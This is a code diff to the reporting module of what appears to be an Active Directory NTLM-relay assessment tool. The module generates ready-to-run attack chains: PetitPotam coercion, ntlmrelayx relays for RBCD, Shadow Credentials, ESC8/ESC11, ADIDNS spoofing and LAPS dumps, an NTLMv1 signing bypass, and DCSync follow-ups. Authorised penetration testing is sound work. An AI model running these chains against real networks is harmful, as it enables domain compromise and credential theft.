@@ -2,13 +2,10 @@
 Output: Rich terminal table + Markdown report writer.
 """
 from __future__ import annotations
-import os
-import sys
 from dataclasses import dataclass
 from datetime import datetime
-from typing import Optional
 
-from .checks.base import AttackResult, Status
+from .checks.base import AttackResult, CheckResult, Status
 from .checks.relay_target_finder import RelayTargetSummary
 
 # ── Rich availability ──────────────────────────────────────────────────────
@@ -18,7 +15,6 @@ try:
     from rich.panel import Panel
     from rich.text import Text
     from rich import box
-    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
     RICH_AVAILABLE = True
 except ImportError:
     RICH_AVAILABLE = False
@@ -32,6 +28,10 @@ VIABILITY_STYLE = {
     "NOT VIABLE": ("bold red",    "❌ NOT VIABLE"),
     "UNKNOWN":    ("dim",         "❓ UNKNOWN"),
 }
+
+# Verdicts that are not actionable findings: NOT VIABLE (prerequisite disproven)
+# and UNKNOWN (nothing could be tested). Both are hidden when quiet (-q) is set.
+_HIDDEN_IN_QUIET = ("NOT VIABLE", "UNKNOWN")
 
 STATUS_STYLE = {
     Status.PASS:  ("green",  "PASS ✓"),
@@ -71,12 +71,45 @@ TIER_STYLE = {
 }
 
 
+# Shared cross-domain relay-target caveat for the LDAP/LDAPS attack chains.
+# Every ntlmrelayx LDAP attack (RBCD/Shadow Creds/LAPS/ACL/Add Computer/ADIDNS)
+# runs the same validatePrivileges preamble in LDAPAttack.run() (on by default),
+# which looks the RELAYED account up in the bound DC's directory and raises
+# IndexError when it isn't there — i.e. when a child-domain account is relayed to
+# a forest-root DC. The write-target object must also live in the bound DC's
+# domain. Centralized so the six chains can't drift.
+_LDAP_RELAY_CRASH_HINT = (
+    "# Cross-domain relay: target the coerced host's own-domain DC (child DC), "
+    "or add --no-validate-privs if validatePrivileges crashes"
+)
+
+
+def _ldap_relay_target_note(escalate_user: bool = False) -> str:
+    """Cross-domain relay-target caveat appended to the LDAP/LDAPS attack chains."""
+    note = (
+        "Cross-domain caveat: relay to a writable DC of the domain holding the "
+        "coerced account and the write-target object. For a coerced child-domain "
+        "host that's the child DC, not the forest root. Otherwise ntlmrelayx's "
+        "validatePrivileges preamble looks the relayed account up in the bound DC's "
+        "domain and crashes (IndexError); --no-validate-privs skips that check, but "
+        "the write still has to land in the bound DC's domain."
+    )
+    if escalate_user:
+        note += (
+            " For --escalate-user, ntlmrelayx does a second same-domain lookup on "
+            "the target principal, so --no-validate-privs alone may not survive a "
+            "cross-domain target — prefer the target's own-domain DC."
+        )
+    return note
+
+
 # ── Attack chain builder ───────────────────────────────────────────────────
 
 def _build_attack_chains(
     results: list[AttackResult],
     env_summary: dict,
     relay_target_summary: "RelayTargetSummary | None" = None,
+    redact_creds: bool = True,
 ) -> list[AttackChain]:
     """
     Cross-reference check results to build a prioritised list of complete
@@ -128,6 +161,48 @@ def _build_attack_chains(
     def _check_pass(ar: "AttackResult | None", name_fragment: str) -> bool:
         c = _get_check(ar, name_fragment)
         return c is not None and c.status.value == "PASS"
+
+    def _ldap_signing_enforced(ar: "AttackResult | None") -> bool:
+        c = _get_check(ar, "LDAP signing not enforced")
+        return c is not None and c.status.value == "FAIL"
+
+    def _ldap_proto(ar: "AttackResult | None") -> str:
+        """Pick the relay channel for an LDAP-write chain.
+
+        ldaps:// is relayable only when channel binding is off. RBCD/Shadow carry
+        the nxc-derived "LDAP channel binding not required"; ACL carries the
+        LDAPS-native "LDAPS channel binding (EPA) not enforced". A PASS on either
+        means CB=Never → the TLS path is open, so prefer ldaps://. Otherwise CB is
+        enforced and ldaps:// is blocked; fall back to plain ldap:// — which the
+        upstream _viable() gate guarantees is relayable (viability then comes from
+        the signing-off or NTLMv1 leg, both of which land over 389).
+        """
+        tls_open = (_check_pass(ar, "LDAP channel binding not required")
+                    or _check_pass(ar, "LDAPS channel binding (EPA) not enforced"))
+        return "ldaps" if tls_open else "ldap"
+
+    def _channel_note(ar: "AttackResult | None") -> str:
+        """Enabler explanation for the plain-ldap:// branch (CB enforced).
+
+        Only meaningful when _ldap_proto(ar) == "ldap". Splits on LDAP signing
+        because that decides whether the HTTP coercion the standard chain renders
+        actually carries the relay, or whether the NTLMv1 SMB path is required.
+        """
+        if _ldap_signing_enforced(ar):
+            # DROP-THE-MIC SUPERSEDE POINT: when the CVE-2019-1040 MIC leg lands
+            # (staged base.py adds CHECK_MIC_NOT_ENFORCED), plain ldap:// under
+            # enforced signing is ALSO reachable via the MIC path + `--remove-mic`,
+            # not only the NTLMv1 SMB path below. The staged output.py's
+            # _remove_mic_flag() covers that; this branch is the pre-MIC subset and
+            # is replaced wholesale when that superset is applied.
+            return ("LDAPS channel binding is enforced (ldaps:// blocked) and LDAP "
+                    "signing is also enforced — plain ldap:// lands ONLY via the NTLMv1 "
+                    "SMB path (ntlmrelayx clears SIGN/SEAL, no MIC to invalidate). HTTP "
+                    "coercion above will not carry it; drive this via the cross-protocol "
+                    "NTLMv1 chain (unsigned SMB coercion source).")
+        return ("LDAPS channel binding is enforced, so ldaps:// is blocked; the relay "
+                "uses plain ldap:// because LDAP signing is not enforced (HTTP or SMB "
+                "coercion both relay cleanly to port 389).")
 
     def _extract_ca_host(ar: "AttackResult | None") -> str:
         """Extract CA hostname from ADCS check detail."""
@@ -221,12 +296,17 @@ def _build_attack_chains(
     _raw_user = env_summary.get("user", "<user>")
     username  = _raw_user.split("\\")[-1] if "\\" in _raw_user else _raw_user
 
-    # Credential for terminal-displayed attack chains. Falls back to placeholder
-    # if the field is absent (e.g. when called from report writers, which must
-    # never read or emit the password/nt_hash fields from env_summary).
+    # Credential placeholder used in chain commands. When redact_creds is True
+    # (the default — used by all file report writers), the real password/NT hash
+    # are NEVER substituted; a placeholder is emitted instead. Only the terminal
+    # path (print_attack_paths) opts in to live creds for copy-paste convenience.
+    # This keeps saved Markdown/HTML/JSON reports free of secret material.
     _nt_hash  = env_summary.get("nt_hash")
     _password = env_summary.get("password") or ""
-    _cred_p   = f"-H {_nt_hash}" if _nt_hash else f"-p '{_password}'"
+    if redact_creds:
+        _cred_p = "-H <nthash>" if _nt_hash else "-p '<password>'"
+    else:
+        _cred_p = f"-H {_nt_hash}" if _nt_hash else f"-p '{_password}'"
 
     def _coerce_cmd(target: str) -> str:
         """Best available coercion command for a target."""
@@ -241,46 +321,132 @@ def _build_attack_chains(
         return (f"# Coerce authentication from target\n"
                 f"  python3 PetitPotam.py -u {username} {_cred_p} -d {domain} {attacker_hostname} {target}")
 
+    # Member-server coercion source for HTTP-coerced LDAP/LDAPS relays. SMB
+    # coercion sets signing flags and can't drive an LDAP relay (the SMB→LDAP
+    # signing wall), so these chains must coerce a MEMBER server over HTTP —
+    # never SMB, never the DC (DCs have WebClient off by default). Prefer a
+    # known non-DC host; otherwise a clear placeholder.
+    _dc_u0, _non_dc_u0 = _extract_unsigned_hosts(_get_ar("SMB"))
+    _relay_victim = _non_dc_u0[0] if _non_dc_u0 else "<member-server-with-webclient>"
+
+    def _http_coerce_cmd(victim: str = _relay_victim) -> str:
+        """HTTP/WebDAV coercion for LDAP/LDAPS relay chains.
+
+        Relaying to LDAP/LDAPS only works from HTTP-coerced auth: SMB coercion
+        sets the signing flags and hits the SMB→LDAP wall. So coerce a MEMBER
+        server (not the DC) over HTTP, with a hostname listener (@80) so Windows
+        follows the WebDAV UNC path instead of falling back to SMB. The relayed
+        machine account's default Authenticated-Users rights are what authorise
+        the LDAP write.
+        """
+        return (f"# Coerce a MEMBER server over HTTP/WebDAV (not the DC, not SMB):\n"
+                f"  python3 PetitPotam.py -u {username} {_cred_p} -d {domain} {attacker_hostname}@80/share {victim}")
+
+    def _coerce_target_avoiding_ca(ca_host_fqdn: str) -> str:
+        """Pick a DC IP to coerce for ESC8/ESC11 that is NOT the CA host.
+
+        These chains relay the coerced auth to the CA. If the coercion target and
+        the CA are the same machine, Windows blocks the relay-to-self, so the
+        attack silently fails. When the default target (dc_ip) resolves to the CA
+        host, swap in another DC. dc_ips is ordered with env.domain's own DC(s)
+        first, so the first non-CA entry is a same-forest DC where possible —
+        cross-forest machine accounts are denied at the certificate-template level.
+        """
+        ca_short = (ca_host_fqdn.split(".")[0].lower()
+                    if ca_host_fqdn and ca_host_fqdn != "<ca-host>" else "")
+        if not ca_short:
+            return dc_ip
+        # Only retarget if the default coercion target IS the CA host (self-relay).
+        if (_hostname_map.get(dc_ip, "") or "").lower() != ca_short:
+            return dc_ip
+        for ip in dc_ips:
+            if (_hostname_map.get(ip, "") or "").lower() != ca_short:
+                return ip
+        return dc_ip  # no distinguishable alternative — the chain note warns the user
+
     # ── 1. DCSync via ACL Abuse ────────────────────────────────────
     acl_ar = _get_ar("ACL Abuse")
     if _viable(acl_ar) and _check_pass(acl_ar, "Writable high-value"):
-        detail = (_get_check(acl_ar, "Writable high-value") or object()).__dict__.get("detail", "")
+        detail = getattr(_get_check(acl_ar, "Writable high-value"), "detail", "") or ""
         if "domain root" in (detail or "").lower():
+            # ACL writes relay over whichever channel is open. Prefer ldaps:// when
+            # LDAPS channel binding is off; otherwise the plain ldap:// path (LDAP
+            # signing off / NTLMv1) — ACL modifications are attribute/SD writes that
+            # succeed over plain LDAP, so LDAPS is not mandatory here.
+            proto = ("ldaps"
+                     if _check_pass(acl_ar, "LDAPS channel binding (EPA) not enforced")
+                     else "ldap")
             chains.append(AttackChain(
                 tier="CRITICAL",
-                title="DCSync via LDAPS ACL Abuse",
-                prereqs="LDAPS relay viable + writable domain root (WriteDACL) confirmed",
-                coerce_cmd=_coerce_cmd(dc_ip),
+                title="DCSync via ACL Abuse",
+                prereqs=f"ACL relay viable ({proto}://) + writable domain root (WriteDACL) confirmed",
+                coerce_cmd=_http_coerce_cmd(),
                 relay_cmd=(
-                    f"# Relay to LDAPS and escalate privileges\n"
-                    f"  ntlmrelayx.py -t ldaps://{dc_ip} --escalate-user {username}"
+                    f"# Relay to {proto.upper()} and escalate privileges\n"
+                    f"  ntlmrelayx.py -t {proto}://{dc_ip} --escalate-user {username}\n"
+                    f"{_LDAP_RELAY_CRASH_HINT}"
                 ),
                 notes=(
                     "Grants DCSync rights to the enumeration account. "
-                    "Follow up: secretsdump.py or mimikatz lsadump::dcsync"
+                    "Follow up: secretsdump.py or mimikatz lsadump::dcsync."
+                    + " " + _ldap_relay_target_note(escalate_user=True)
                 ),
             ))
 
     # ── 2. Full domain compromise via ADCS ESC8 ───────────────────
     adcs_ar  = _get_ar("ESC8")
     ca_host  = _extract_ca_host(adcs_ar)
-    ca_name  = _extract_ca_name(adcs_ar)
     if _viable(adcs_ar):
-        chains.append(AttackChain(
-            tier="CRITICAL",
-            title="Domain Compromise via ADCS ESC8",
-            prereqs="ADCS ESC8 confirmed — certsrv HTTP endpoint accepts NTLM relay",
-            coerce_cmd=_coerce_cmd(dc_ip),
-            relay_cmd=(
-                f"# Relay DC auth to certsrv to obtain a DC certificate\n"
-                f"  ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp "
-                f"--adcs --template DomainController"
-            ),
-            notes=(
-                "Relay DC machine account auth to certsrv → obtain DC certificate → "
-                "PKINITtools or Rubeus to get TGT → DCSync"
-            ),
-        ))
+        # Only the plain-HTTP 401+NTLM path is a *confirmed* relay target
+        # (CertsrvHttpCheck PASS). If that check did not PASS, the module is
+        # viable only via the HTTPS path, whose decisive gate — EPA — is not
+        # remotely detectable. Render that case as a CONDITIONAL chain rather
+        # than a "confirmed" CRITICAL one, so a hardened HTTPS+EPA-enforced CA
+        # is not falsely reported as a confirmed domain-compromise path.
+        if _check_pass(adcs_ar, "Web enrollment endpoint reachable"):
+            chains.append(AttackChain(
+                tier="CRITICAL",
+                title="Domain Compromise via ADCS ESC8",
+                prereqs="ADCS ESC8 confirmed — certsrv HTTP endpoint accepts NTLM relay",
+                coerce_cmd=_coerce_cmd(_coerce_target_avoiding_ca(ca_host)),
+                relay_cmd=(
+                    f"# Relay DC auth to certsrv to obtain a DC certificate\n"
+                    f"  ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp "
+                    f"--adcs --template DomainController"
+                ),
+                notes=(
+                    "Relay DC machine account auth to certsrv → obtain DC certificate → "
+                    "PKINITtools or Rubeus to get TGT → DCSync. "
+                    "Coerce a DC other than the CA host — relay-to-self is blocked; "
+                    "prefer a same-forest DC (cross-forest is denied at the template)."
+                ),
+            ))
+        else:
+            chains.append(AttackChain(
+                tier="CRITICAL",
+                title="Domain Compromise via ADCS ESC8 (conditional — HTTPS/EPA unconfirmed)",
+                prereqs=(
+                    "certsrv reachable over HTTPS only — no plain-HTTP NTLM endpoint confirmed. "
+                    "Relay is viable ONLY if Extended Protection for Authentication (EPA) is not "
+                    "enforced on the IIS binding, which is NOT remotely detectable — so ESC8 here "
+                    "is UNCONFIRMED. Verify EPA before relying on this path."
+                ),
+                coerce_cmd=_coerce_cmd(_coerce_target_avoiding_ca(ca_host)),
+                relay_cmd=(
+                    f"# Relay DC auth to certsrv over HTTPS (only succeeds if EPA is disabled)\n"
+                    f"  ntlmrelayx.py -t https://{ca_host}/certsrv/certfnsh.asp "
+                    f"--adcs --template DomainController"
+                ),
+                notes=(
+                    "CONDITIONAL — not a confirmed path. If EPA is enforced (the hardened default on "
+                    "modern CAs) this relay is blocked and ESC8 is NOT viable here. Confirm EPA state "
+                    "on the CA host first: check the IIS 'certsrv' application's Extended Protection "
+                    "setting (Off = relayable) or "
+                    "`reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters "
+                    "/v ExtendedProtection`. If EPA is off: relay DC machine-account auth → DC "
+                    "certificate → PKINITtools/Rubeus TGT → DCSync. Coerce a DC other than the CA host."
+                ),
+            ))
 
     # ── 3. Domain Compromise via ADCS ESC11 ───────────────────────
     esc11_ar = _get_ar("ESC11")
@@ -291,13 +457,17 @@ def _build_attack_chains(
             tier="CRITICAL",
             title="Domain Compromise via ADCS ESC11 (RPC relay)",
             prereqs="ADCS ESC11 confirmed — CA RPC interface accepts NTLM relay",
-            coerce_cmd=_coerce_cmd(dc_ip),
+            coerce_cmd=_coerce_cmd(_coerce_target_avoiding_ca(esc11_ca_host)),
             relay_cmd=(
                 f"# Relay DC auth directly to the CA via RPC\n"
                 f"  ntlmrelayx.py -t rpc://{esc11_ca_host} -rpc-mode ICPR "
                 f"-icpr-ca-name '{esc11_ca_name}' --template DomainController"
             ),
-            notes="No certsrv HTTP needed — relays directly over RPC to the CA.",
+            notes=(
+                "No certsrv HTTP needed — relays directly over RPC to the CA. "
+                "Coerce a DC other than the CA host — relay-to-self is blocked; "
+                "prefer a same-forest DC (cross-forest is denied at the template)."
+            ),
         ))
 
     # ── 4. Kerberos Relay → ADCS ──────────────────────────────────
@@ -355,17 +525,20 @@ def _build_attack_chains(
                 f"LDAP relay viable + writable computer ({sc_target}) + KDC cert"
                 + (" + ADCS present (full UnPAC chain)" if adcs_present else " (TGT only — no ADCS)")
             ),
-            coerce_cmd=_coerce_cmd(dc_ip),
+            coerce_cmd=_http_coerce_cmd(),
             relay_cmd=(
-                f"# Relay to LDAPS and write Shadow Credentials\n"
-                f"  ntlmrelayx.py -t ldaps://{dc_ip} --shadow-credentials "
-                f"--shadow-target {sc_target}$"
+                f"# Relay to {_ldap_proto(sc_ar).upper()} and write Shadow Credentials\n"
+                f"  ntlmrelayx.py -t {_ldap_proto(sc_ar)}://{dc_ip} --shadow-credentials "
+                f"--shadow-target {sc_target}$\n"
+                f"{_LDAP_RELAY_CRASH_HINT}"
             ),
             notes=(
                 "Writes msDS-KeyCredentialLink → PKINIT TGT for target machine account. "
                 + ("Then: PKINITtools getnthash.py → pass-the-hash." if adcs_present
                    else "ADCS not found — TGT obtained but NT hash recovery requires ADCS.")
                 + sc_dc_note
+                + " " + _ldap_relay_target_note()
+                + (" " + _channel_note(sc_ar) if _ldap_proto(sc_ar) == "ldap" else "")
             ),
         ))
 
@@ -382,20 +555,69 @@ def _build_attack_chains(
             " Target is a DC — S4U2Self as any domain user to DC enables DCSync-equivalent access."
             if rbcd_target_is_dc else ""
         )
+        rbcd_proto = _ldap_proto(rbcd_ar)
+        # Over plain ldap:// (CB enforced) the relay can't create the delegate
+        # machine account — that needs a confidential channel (ldaps://636 or
+        # StartTLS-on-389), both under channel binding. Reuse a pre-existing
+        # writable computer as the delegate, or pre-create one out-of-band.
+        if rbcd_proto == "ldaps":
+            rbcd_create_note = "ntlmrelayx creates attacker machine account automatically. "
+        else:
+            _delegate = (rbcd_target if rbcd_target != "<target-computer>"
+                         else "a pre-existing writable computer")
+            rbcd_create_note = (
+                "Over plain ldap:// the relay CANNOT create the delegate machine account "
+                "(needs a confidential channel — ldaps://636 or StartTLS, both under "
+                f"channel binding); reuse {_delegate} as the delegate, or pre-create one "
+                "out-of-band (add via a separate ldaps:// path or an owned account). ")
         chains.append(AttackChain(
             tier=rbcd_tier,
             title="RBCD (Resource-Based Constrained Delegation)",
             prereqs=f"LDAP relay viable + writable computer ({rbcd_target}) + MAQ > 0",
-            coerce_cmd=_coerce_cmd(dc_ip),
+            coerce_cmd=_http_coerce_cmd(),
             relay_cmd=(
-                f"# Relay to LDAPS and configure RBCD\n"
-                f"  ntlmrelayx.py -t ldaps://{dc_ip} --delegate-access"
+                f"# Relay to {rbcd_proto.upper()} and configure RBCD\n"
+                f"  ntlmrelayx.py -t {rbcd_proto}://{dc_ip} --delegate-access\n"
+                f"{_LDAP_RELAY_CRASH_HINT}"
             ),
             notes=(
                 f"Relay writes msDS-AllowedToActOnBehalfOfOtherIdentity on {rbcd_target}. "
-                "ntlmrelayx creates attacker machine account automatically. "
-                "Follow up: getST.py → pass-the-ticket → secretsdump."
+                + rbcd_create_note
+                + "Follow up: getST.py → pass-the-ticket → secretsdump."
                 + rbcd_dc_note
+                + " " + _ldap_relay_target_note()
+                + (" " + _channel_note(rbcd_ar) if rbcd_proto == "ldap" else "")
+            ),
+        ))
+
+    # ── 6b. ADIDNS spoofing (relay LDAP → create DNS record) ──────
+    adidns_ar = _get_ar("ADIDNS")
+    if _viable(adidns_ar):
+        _open_acl = _check_pass(adidns_ar, "any account")
+        _acl_note = (
+            "Authenticated Users hold CreateChild on the zone — any relayed account works. "
+            if _open_acl else
+            "Open CreateChild not confirmed — relay a principal that holds CreateChild "
+            "(DnsAdmins / privileged machine or user account). "
+        )
+        chains.append(AttackChain(
+            tier="HIGH",
+            title="ADIDNS Spoofing (relay to LDAP → create DNS record)",
+            prereqs="LDAP relay viable + AD-integrated DNS zone present",
+            coerce_cmd=_http_coerce_cmd(),
+            relay_cmd=(
+                f"# Relay to LDAP and create an attacker-controlled A record\n"
+                f"  ntlmrelayx.py -t ldap://{dc_ip} --add-dns-record attacker {attacker} --no-dump --no-da --no-acl\n"
+                f"{_LDAP_RELAY_CRASH_HINT}"
+            ),
+            notes=(
+                f"{_acl_note}"
+                "Creates a new dnsNode A record pointing an attacker-chosen hostname at "
+                f"the attacker ({attacker}); any client resolving that name then connects to "
+                "you, enabling capture or onward relay beyond the local subnet. A `wpad` "
+                "record is especially high-value (proxy auto-config). mitm6 (-6 -wh) is a "
+                "coercion-free alternative when DHCPv6 is unanswered."
+                + " " + _ldap_relay_target_note()
             ),
         ))
 
@@ -408,12 +630,12 @@ def _build_attack_chains(
             title="SMB Secretsdump — Domain Controller",
             prereqs=f"SMB signing DISABLED on DC: {', '.join(dc_unsigned)}",
             coerce_cmd=(
-                f"# Capture authentication via poisoning\n"
-                f"  sudo responder -I <iface> -dP"
+                "# Capture authentication via poisoning\n"
+                "  sudo responder -I <iface> -dP"
             ),
             relay_cmd=(
-                f"# Relay to unsigned SMB targets\n"
-                f"  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
+                "# Relay to unsigned SMB targets\n"
+                "  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
             ),
             notes=(
                 "DC with signing disabled — relay gives NTDS.dit equivalent (all domain hashes). "
@@ -429,12 +651,12 @@ def _build_attack_chains(
             title="SMB Secretsdump — Member Server / Workstation",
             prereqs=f"SMB signing DISABLED on: {targets_str}",
             coerce_cmd=(
-                f"# Capture authentication via poisoning\n"
-                f"  sudo responder -I <iface> -dP"
+                "# Capture authentication via poisoning\n"
+                "  sudo responder -I <iface> -dP"
             ),
             relay_cmd=(
-                f"# Relay to unsigned SMB targets\n"
-                f"  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
+                "# Relay to unsigned SMB targets\n"
+                "  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
             ),
             notes=(
                 "Dumps local SAM + LSA secrets. May include cached domain credentials "
@@ -509,14 +731,16 @@ def _build_attack_chains(
             tier="MEDIUM",
             title="LAPS Password Dump",
             prereqs="LDAP relay viable + LAPS deployed + relay account has LAPS read permission",
-            coerce_cmd=_coerce_cmd(dc_ip),
+            coerce_cmd=_http_coerce_cmd(),
             relay_cmd=(
                 f"# Relay to LDAP and dump LAPS passwords\n"
-                f"  ntlmrelayx.py -t ldap://{dc_ip} --dump-laps"
+                f"  ntlmrelayx.py -t ldap://{dc_ip} --dump-laps\n"
+                f"{_LDAP_RELAY_CRASH_HINT}"
             ),
             notes=(
                 "Dumps local Administrator passwords for LAPS-managed computers. "
                 "Scope depends on relay account's LAPS read delegation."
+                + " " + _ldap_relay_target_note()
             ),
         ))
 
@@ -527,16 +751,114 @@ def _build_attack_chains(
             tier="MEDIUM",
             title="LDAPS Add Computer Account",
             prereqs=f"LDAPS relay viable + MAQ > 0 on {dc_ip}",
-            coerce_cmd=_coerce_cmd(dc_ip),
+            coerce_cmd=_http_coerce_cmd(),
             relay_cmd=(
                 f"# Relay to LDAPS and create a machine account\n"
-                f"  ntlmrelayx.py -t ldaps://{dc_ip} --add-computer"
+                f"  ntlmrelayx.py -t ldaps://{dc_ip} --add-computer\n"
+                f"{_LDAP_RELAY_CRASH_HINT}"
             ),
             notes=(
                 "Creates an attacker-controlled machine account. "
                 "Use the new account as the delegation principal for RBCD or Shadow Creds."
+                + " " + _ldap_relay_target_note()
             ),
         ))
+
+    # ── 12. Cross-protocol: SMB → LDAP via NTLMv1 ─────────────────
+    # When LDAP signing is enforced the standard LDAP chains above show
+    # NOT VIABLE and never fire. But if NTLMv1 is accepted, ntlmrelayx can
+    # strip the (absent) MIC and clear the SIGN/SEAL flags on the relayed
+    # message, so SMB auth still relays to *plain* ldap:// even with
+    # LdapServerIntegrity=2. Surface the LDAP-dependent chains via this path
+    # when all three conditions hold:
+    #   (a) NTLMv1 accepted on >=1 probed DC   (NtlmV1AuthProbeCheck PASS)
+    #   (b) LDAP signing enforced              (LdapSigningCheck FAIL)
+    #   (c) >=1 unsigned SMB host (coercion source) exists
+    def _ntlmv1_accepted_ar() -> "AttackResult | None":
+        # The probe is a shared check living in the rbcd/shadowcreds/laps
+        # modules; any module's PASS result reflects the same per-DC probe.
+        for frag in ("RBCD", "Shadow Credentials", "LAPS", "ADIDNS"):
+            ar = _get_ar(frag)
+            if _check_pass(ar, "NTLMv1 authentication accepted"):
+                return ar
+        return None
+
+    _ntlmv1_ar = _ntlmv1_accepted_ar()
+    smb_ar_xp = _get_ar("SMB")
+    dc_u_xp, non_dc_u_xp = _extract_unsigned_hosts(smb_ar_xp)
+    coercion_source = (non_dc_u_xp + dc_u_xp)  # prefer a member server as source
+
+    if _ntlmv1_ar and coercion_source:
+        # Extract the NTLMv1-accepting DC for the relay target; fall back to dc_ip.
+        nv1_check = _get_check(_ntlmv1_ar, "NTLMv1 authentication accepted")
+        ldap_dc = dc_ip
+        if nv1_check and nv1_check.detail:
+            m = re.search(r"ACCEPTED via:[^(]*\((\d{1,3}(?:\.\d{1,3}){3})\)", nv1_check.detail)
+            if m:
+                ldap_dc = m.group(1)
+        src = coercion_source[0]
+        src_label = f"{_hostname_map.get(src, src)} ({src})" if _hostname_map.get(src) else src
+        nv1_note = (
+            "NTLMv1 accepted — ntlmrelayx clears SIGN/SEAL on the relayed message "
+            "(no MIC to invalidate), so SMB auth relays to plain ldap:// even though "
+            "LDAP signing is enforced. Target ldap:// (NOT ldaps://) — the flag clearing "
+            "only works on the unencrypted channel."
+        )
+
+        # Pull the concrete writable-object targets so the relay commands are
+        # actionable, mirroring the standard chains above.
+        _rbcd_t = _extract_writable_computers(_get_ar("RBCD"), "Writable computer")
+        _sc_t = _extract_writable_computers(_get_ar("Shadow Credentials"), "Writable object")
+        rbcd_target_xp = _rbcd_t[0] if _rbcd_t else "<target-computer>"
+        sc_target_xp = _sc_t[0] if _sc_t else "<target-computer>"
+
+        # Only surface a cross-protocol variant for a module whose *sole* blocker
+        # is LDAP signing (i.e. it would be viable on the SMB→LDAP path).
+        xp_specs = [
+            ("RBCD", "Cross-Protocol RBCD (SMB→LDAP via NTLMv1)",
+             "--delegate-access",
+             "Relay writes msDS-AllowedToActOnBehalfOfOtherIdentity. "
+             "Follow up: getST.py → pass-the-ticket → secretsdump."),
+            ("Shadow Credentials", "Cross-Protocol Shadow Credentials (SMB→LDAP via NTLMv1)",
+             f"--shadow-credentials --shadow-target {sc_target_xp}$",
+             "Writes msDS-KeyCredentialLink → PKINIT TGT for the target machine account."),
+            ("LAPS", "Cross-Protocol LAPS Dump (SMB→LDAP via NTLMv1)",
+             "--dump-laps",
+             "Dumps local Administrator passwords for LAPS-managed computers."),
+            ("ADIDNS", "Cross-Protocol ADIDNS Spoofing (SMB→LDAP via NTLMv1)",
+             f"--add-dns-record attacker {attacker} --no-dump --no-da --no-acl",
+             "Relay creates a new DNS A record (dnsNode) pointing an attacker-chosen "
+             f"hostname at the attacker ({attacker}); any client resolving it connects "
+             "to you. A `wpad` record is especially high-value."),
+        ]
+        for frag, title, relay_flags, follow in xp_specs:
+            ar = _get_ar(frag)
+            if ar is None or not _ldap_signing_enforced(ar):
+                continue
+            # If the module is already viable (signing not actually enforced),
+            # the standard chain above covers it — skip the cross-protocol variant.
+            if _viable(ar):
+                continue
+            _tgt_note = ""
+            if frag == "RBCD" and rbcd_target_xp != "<target-computer>":
+                _tgt_note = f" + writable computer ({rbcd_target_xp})"
+            elif frag == "Shadow Credentials" and sc_target_xp != "<target-computer>":
+                _tgt_note = f" + writable object ({sc_target_xp})"
+            chains.append(AttackChain(
+                tier="HIGH",
+                title=title,
+                prereqs=(
+                    f"NTLMv1 accepted (DC {ldap_dc}) + LDAP signing enforced "
+                    f"+ unsigned SMB coercion source ({src_label}){_tgt_note}"
+                ),
+                coerce_cmd=_coerce_cmd(src),
+                relay_cmd=(
+                    f"# Relay SMB→LDAP over the unencrypted channel (NTLMv1 bypass)\n"
+                    f"  ntlmrelayx.py -t ldap://{ldap_dc} {relay_flags}\n"
+                    f"{_LDAP_RELAY_CRASH_HINT}"
+                ),
+                notes=f"{follow} {_ldap_relay_target_note()} {nv1_note}",
+            ))
 
     # Sort by tier, then alphabetically within tier
     chains.sort(key=lambda c: (TIER_ORDER.get(c.tier, 99), c.title))
@@ -548,7 +870,10 @@ def print_attack_paths(
     relay_target_summary: "RelayTargetSummary | None" = None,
 ) -> None:
     """Print the Recommended Attack Paths section to the terminal."""
-    chains = _build_attack_chains(results, env_summary, relay_target_summary)
+    # Terminal output is the one place live creds are substituted (convenience);
+    # file reports use the redacted default.
+    chains = _build_attack_chains(results, env_summary, relay_target_summary,
+                                  redact_creds=False)
     if not chains:
         return
     if RICH_AVAILABLE:
@@ -573,7 +898,6 @@ def _print_rich_attack_paths(chains: list[AttackChain]) -> None:
         console.print(
             f"  [{tier_style}]{tier_label}[/]  [bold white]{chain.title}[/]"
         )
-        console.print(f"  [dim]Prerequisites:[/] {chain.prereqs}", highlight=False)
         console.print()
 
         first_coerce = True
@@ -589,17 +913,14 @@ def _print_rich_attack_paths(chains: list[AttackChain]) -> None:
                 console.print(f"    [green]{line.strip()}[/]", highlight=False)
                 first_coerce = False
 
-        first_relay = True
         for line in (chain.relay_cmd or "").splitlines():
             if not line.strip():
                 pass
             elif line.strip().startswith("#"):
                 console.print()
                 console.print(f"    [white]{line.strip()}[/]", highlight=False)
-                first_relay = False
             else:
                 console.print(f"    [cyan]{line.strip()}[/]", highlight=False)
-                first_relay = False
 
         if chain.notes:
             console.print()
@@ -620,7 +941,6 @@ def _print_plain_attack_paths(chains: list[AttackChain]) -> None:
     print(sep)
     for i, chain in enumerate(chains, 1):
         print(f"\n  [{chain.tier}] {chain.title}")
-        print(f"  Prerequisites: {chain.prereqs}")
         first_coerce = True
         for line in chain.coerce_cmd.splitlines():
             if not line.strip():
@@ -649,7 +969,8 @@ def _print_plain_attack_paths(chains: list[AttackChain]) -> None:
     print()
 
 
-def print_summary_table(results: list[AttackResult], verbose: bool = False) -> None:
+def print_summary_table(results: list[AttackResult], verbose: bool = False,
+                        quiet: bool = False) -> None:
     """Print the viability summary table only.
 
     Per-check verbose details are deliberately excluded here.  Call
@@ -657,28 +978,50 @@ def print_summary_table(results: list[AttackResult], verbose: bool = False) -> N
     Recommended Attack Paths section sits between the summary table and the
     detail dump.  The ``verbose`` parameter is accepted for backward-compat
     but ignored.
+
+    When ``quiet=True`` NOT VIABLE and UNKNOWN rows are omitted from the table.  If this
+    leaves nothing to display, a one-line suppression notice is printed instead
+    of an empty table.
     """
+    display = [r for r in results if r.viability not in _HIDDEN_IN_QUIET] if quiet else results
+    suppressed = len(results) - len(display)
+    if quiet and not display:
+        try:
+            from rich.console import Console as _C
+            _C().print(f"\n[dim]No viable attack paths found. "
+                       f"{suppressed} module(s) hidden (NOT VIABLE / UNKNOWN).[/]")
+        except ImportError:
+            print(f"\nNo viable attack paths found. "
+                  f"{suppressed} module(s) hidden (NOT VIABLE / UNKNOWN).")
+        return
     if RICH_AVAILABLE:
-        _print_rich_summary_table(results)
+        _print_rich_summary_table(display, quiet=quiet, suppressed=suppressed)
     else:
